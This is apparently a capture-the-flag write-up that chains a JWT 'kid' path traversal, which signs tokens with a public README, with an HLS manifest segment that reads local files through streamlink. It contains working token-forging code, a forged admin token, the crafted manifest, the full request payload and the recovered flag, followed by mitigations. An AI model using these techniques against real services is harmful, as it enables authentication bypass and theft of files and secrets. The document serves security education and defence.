# Vulnerability Report DOJO 52

---

## JWT kid Path Traversal Leading to Signature Forgery, Chained with HLS Manifest Arbitrary File Read

The application exposes a small service that accepts an HLS manifest (a `.u3m8` / `.m3u8` playlist), opens the resulting stream with `streamlink`, and returns the first chunk of decoded data. Access is gated behind a JWT that must carry an `isadmin` claim. The signature verification trusts the `kid` header field, which the client fully controls, to locate the HMAC key on disk. Because that field is concatenated into a file path without any validation, an attacker can point it at a file whose content is publicly known (the bundled `README.txt`) and use that content as the signing key. With a forged admin token in hand, the manifest is then crafted so that one of its segments references `file:///tmp/flag.txt`. `streamlink` dutifully opens that segment and the service hands the file content straight back. The whole chain runs in a single request.

---

## Root Cause: Step-by-Step Breakdown

The chain combines two independent weaknesses. The first defeats authentication, the second turns an authenticated request into an arbitrary file read.

### Weakness 1: The kid header decides which file is used as the signing key

```python
def load_key(kid: str) -> bytes:
    with open(f"/tmp/keys/{kid}.txt", "rb") as f:
        return f.read()

def verify_token(token: str) -> dict:
    header = jwt.get_unverified_header(token)
    kid = header.get("kid")
    key = load_key(kid)
    return jwt.decode(token, key, algorithms=["HS256"])
```

The `kid` ("key id") field is read from the unverified token header, meaning it is taken directly from attacker input before any signature has been checked. It is then interpolated into a file path with no sanitization. There is no allowlist of valid key identifiers, no check for path separators, and no check for `..` sequences.

Setting the `kid` to `../README` resolves the path as follows:

```
/tmp/keys/../README.txt  ->  /tmp/README.txt
```

A single traversal step is enough here, because the key directory is one level below `/tmp` and the target sits directly in `/tmp`. The `.txt` suffix is appended by the application, but the README already ends in `.txt`, so the suffix lands cleanly on an existing file.

### The signing key is publicly known

The README is written at setup time with a fixed string:

```python
with open("/tmp/README.txt", "w") as f:
    f.write("streamcore is a new project developed to handle u3m8 files more easily.")
```

Its exact bytes are therefore known in advance. Once the verifier can be steered to use this file as the HMAC secret, the attacker holds the same secret the server will verify against. From that point, forging a valid `HS256` token with any claims is trivial. The random 32 byte key generated under `/tmp/keys/` is never needed and never has to be guessed.

### Weakness 2: Manifest segments are opened without restriction

```python
filename_path = f"/tmp/{filename}.m3u8"
with open(filename_path, "w") as f:
    f.write(content)

streams = streamlink.streams(f"hls://file:///{filename_path}")
fd = streams["best"].open()
chunk = fd.read(1024 * 1024).decode("UTF-8")
```

An HLS manifest is, in practice, a list of URLs that the player is expected to fetch and concatenate. Nothing here constrains those URLs. The manifest itself is loaded over `file://`, and when a segment is given as `file:///tmp/flag.txt`, `streamlink` resolves and opens it like any other media segment, then returns the bytes to the caller. The same behaviour applies to `http://` and `https://` segments, which makes this a server side request forgery primitive as well as a local file read.

The only practical constraint is the final `.decode("UTF-8")`: the read content must be valid UTF-8, so the primitive is limited to text files and text responses. Binary targets raise a `UnicodeDecodeError` and produce no output.

### The filename check is not an obstacle

```python
def valid_filename(filename: str):
    return re.match(r"^[A-Za-z0-9_-]+$", filename)
```

This only governs the name of the temporary manifest file written to `/tmp`. It has no bearing on the segment URLs inside the manifest, so a plain value such as `pwn` satisfies it and the attack proceeds.

---

## Exploitation: Step-by-Step

The server processes a single JSON input and executes the steps in order: verify the token, check `isadmin`, validate the filename, write the manifest, open the stream, return the first chunk. Forging the token and reading the flag happen in the same round trip.

### Step 1: Forge the admin token

The token is signed with the README content as the HMAC key, and the `kid` header is set to traverse to that file.

```python
import jwt

# Content is fixed at setup time and therefore known to the attacker.
README_BYTES = b"streamcore is a new project developed to handle u3m8 files more easily."

token = jwt.encode(
    {"isadmin": True},
    README_BYTES,
    algorithm="HS256",
    headers={"kid": "../README"},
)
print(token)
```

This produces a token whose header is `{"alg": "HS256", "kid": "../README", "typ": "JWT"}` and whose payload is `{"isadmin": true}`. No expiry claim is required, since the verifier only enforces claims that are present.

### Step 2: Craft the manifest that points at the flag

```
#EXTM3U
#EXT-X-VERSION:3
#EXT-X-TARGETDURATION:10
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
file:///tmp/flag.txt
#EXT-X-ENDLIST
```

The single segment is an absolute `file://` URL pointing at the flag. A relative segment of `flag.txt` works equally well, since the manifest is written to `/tmp/pwn.m3u8` and relative segments resolve against that location.

### Step 3: Assemble and send the request

```python
import json

manifest = "\n".join([
    "#EXTM3U",
    "#EXT-X-VERSION:3",
    "#EXT-X-TARGETDURATION:10",
    "#EXT-X-MEDIA-SEQUENCE:0",
    "#EXTINF:10.0,",
    "file:///tmp/flag.txt",
    "#EXT-X-ENDLIST",
])

payload = {
    "filename": "pwn",
    "content": manifest,
    "token": token,   # from Step 1
}

print(json.dumps(payload))
```

---

## Proof of Concept

### Single request: forged token plus flag read

| Field | Value |
|---|---|
| `filename` | `pwn` |
| `content` | manifest with a single segment `file:///tmp/flag.txt` (see Step 2) |
| `token` | `eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uL1JFQURNRSIsInR5cCI6IkpXVCJ9.eyJpc2FkbWluIjp0cnVlfQ.ma7hL-YrU031b3g9WouAbxkq408z5PYIBGXSnMZ5wQE` |

The complete JSON sent to the input box:

```json
{"filename":"pwn","content":"#EXTM3U\n#EXT-X-VERSION:3\n#EXT-X-TARGETDURATION:10\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nfile:///tmp/flag.txt\n#EXT-X-ENDLIST","token":"eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uL1JFQURNRSIsInR5cCI6IkpXVCJ9.eyJpc2FkbWluIjp0cnVlfQ.ma7hL-YrU031b3g9WouAbxkq408z5PYIBGXSnMZ5wQE"}
```

**Flag:** `FLAG{R3ad1ng_F1l3s_As_A_S3rvic3!}`

---

## Impact

An attacker with no legitimate credentials can forge an administrative token from a file whose content is public, then use the resulting access to read arbitrary UTF-8 files on the host and to issue arbitrary outbound HTTP requests from the server. In this challenge that yields full disclosure of the flag, but the same primitive exposes configuration files, environment secrets, and internal network services on a production deployment. The authentication control offers no real protection, since the secret it relies on can be substituted at will by the requester.

---

## Mitigation

### 1. Do not let the kid select an arbitrary file

Treat the `kid` as an opaque identifier and resolve it through a fixed mapping rather than a file path. Reject any value that is not in a known set, and never interpolate it into a filesystem path.

```python
KEYS = {
    "v1": load_key_material("v1"),  # resolved internally, not from user input
}

def verify_token(token: str) -> dict:
    header = jwt.get_unverified_header(token)
    kid = header.get("kid")
    if kid not in KEYS:
        raise ValueError("unknown key id")
    return jwt.decode(token, KEYS[kid], algorithms=["HS256"])
```

If a path must be used, canonicalize it and confirm it stays inside the intended key directory before opening it.

### 2. Never use a publicly readable file as a signing secret

The README is shipped with the application and its content is known. A signing key must be secret, generated at deploy time, and stored outside any path the request can influence.

### 3. Restrict the URL schemes and destinations the manifest may reference

Before handing the manifest to `streamlink`, parse the segment URIs and reject anything that is not an allowed scheme and host. Block `file://`, block requests to loopback, link local, and private address ranges, and apply the same checks again after any redirect.

### 4. Do not return raw media bytes to the user

The service returns the decoded content of whatever it opens. If the use case allows it, return only metadata or a controlled transformation, never the raw first chunk of an arbitrary resource.
